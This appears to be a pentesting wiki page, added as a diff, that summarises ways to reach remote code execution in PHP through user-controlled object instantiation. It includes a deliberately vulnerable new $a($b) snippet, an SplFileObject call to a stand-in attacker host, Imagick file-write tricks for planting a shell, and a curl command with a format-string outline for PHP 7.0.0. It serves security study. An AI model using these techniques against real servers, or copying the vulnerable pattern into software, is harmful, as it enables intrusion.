@@ -1,0 +1,126 @@
+# PHP - RCE abusing object creation: new $_GET["a"]($_GET["b"])
+
+This is basically a summary of [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)
+
+## Introduction
+
+The creation of new arbitrary objects, such as `new $_GET["a"]($_GET["a"])`, can lead to Remote Code Execution (RCE), as detailed in a [**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/). This document highlights various strategies for achieving RCE.
+
+## RCE via Custom Classes or Autoloading
+
+The syntax `new $a($b)` is used to instantiate an object where **`$a`** represents the class name and **`$b`** is the first argument passed to the constructor. These variables can be sourced from user inputs like GET/POST, where they may be strings or arrays, or from JSON, where they might present as other types.
+
+Consider the code snippet below:
+
+```php
+class App {
+    function __construct ($cmd) {
+        system($cmd);
+    }
+}
+
+class App2 {
+    function App2 ($cmd) {
+        system($cmd);
+    }
+}
+
+$a = $_GET['a'];
+$b = $_GET['b'];
+
+new $a($b);
+```
+
+In this instance, setting `$a` to `App` or `App2` and `$b` to a system command (e.g., `uname -a`) results in the execution of that command.
+
+**Autoloading functions** can be exploited if no such classes are directly accessible. These functions automatically load classes from files when needed and are defined using `spl_autoload_register` or `__autoload`:
+
+```php
+spl_autoload_register(function ($class_name) {
+    include './../classes/' . $class_name . '.php';
+});
+
+function __autoload($class_name) {
+    include $class_name . '.php';
+};
+
+spl_autoload_register();
+```
+
+The behavior of autoloading varies with PHP versions, offering different RCE possibilities.
+
+## RCE via Built-In Classes
+
+Lacking custom classes or autoloaders, **built-in PHP classes** may suffice for RCE. The number of these classes ranges between 100 to 200, based on PHP version and extensions. They can be listed using `get_declared_classes()`.
+
+Constructors of interest can be identified through the reflection API, as shown in the following example and the link [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF).
+
+**RCE via specific methods includes:**
+
+### **SSRF + Phar Deserialization**
+
+The `SplFileObject` class enables SSRF through its constructor, allowing connections to any URL:
+
+```php
+new SplFileObject('http://attacker.com/');
+```
+
+SSRF can lead to deserialization attacks in versions of PHP before 8.0 using the Phar protocol.
+
+### **Exploiting PDOs**
+
+The PDO class constructor allows connections to databases via DSN strings, potentially enabling file creation or other interactions:
+
+```php
+new PDO("sqlite:/tmp/test.txt")
+```
+
+### **SoapClient/SimpleXMLElement XXE**
+
+Versions of PHP up to 5.3.22 and 5.4.12 were susceptible to XXE attacks through the `SoapClient` and `SimpleXMLElement` constructors, contingent on the version of libxml2.
+
+## RCE via Imagick Extension
+
+In the analysis of a **project's dependencies**, it was discovered that **Imagick** could be leveraged for **command execution** by instantiating new objects. This presents an opportunity for exploiting vulnerabilities.
+
+### VID parser
+
+The VID parser capability of writing content to any specified path in the filesystem was identified. This could lead to the placement of a PHP shell in a web-accessible directory, achieving Remote Code Execution (RCE).
+
+#### VID Parser + File Upload
+
+It's noted that PHP temporarily stores uploaded files in `/tmp/phpXXXXXX`. The VID parser in Imagick, utilizing the **msl** protocol, can handle wildcards in file paths, facilitating the transfer of the temporary file to a chosen location. This method offers an additional approach to achieve arbitrary file writing within the filesystem.
+
+### PHP Crash + Brute Force
+
+A method described in the [**original writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) involves uploading files that trigger a server crash before deletion. By brute-forcing the name of the temporary file, it becomes possible for Imagick to execute arbitrary PHP code. However, this technique was found to be effective only in an outdated version of ImageMagick.
+
+## Format-string in class-name resolution (PHP 7.0.0 Bug #71105)
+
+When user input controls the class name (e.g., `new $_GET['model']()`), PHP 7.0.0 introduced a transient bug during the `Throwable` refactor where the engine mistakenly treated the class name as a printf format string during resolution. This enables classic printf-style primitives inside PHP: leaks with `%p`, write-count control with width specifiers, and arbitrary writes with `%n` against in-process pointers (for example, GOT entries on ELF builds).
+
+Minimal repro vulnerable pattern:
+
+```php
+<?php
+$model = $_GET['model'];
+$object = new $model();
+```
+
+Exploitation outline (from the reference):
+- Leak addresses via `%p` in the class name to find a writable target:
+  ```bash
+  curl "http://host/index.php?model=%p-%p-%p"
+  # Fatal error includes resolved string with leaked pointers
+  ```
+- Use positional parameters and width specifiers to set an exact byte-count, then `%n` to write that value to an address reachable on the stack, aiming at a GOT slot (e.g., `free`) to partially overwrite it to `system`.
+- Trigger the hijacked function by passing a class name containing a shell pipe to reach `system("id")`.
+
+Notes:
+- Works only on PHP 7.0.0 (Bug [#71105](https://bugs.php.net/bug.php?id=71105)); fixed in subsequent releases. Severity: critical if arbitrary class instantiation exists.
+- Typical payloads chain many `%p` to walk the stack, then `%.<width>d%<pos>$n` to land the partial overwrite.
+
+## References
+
+- [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)
+- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
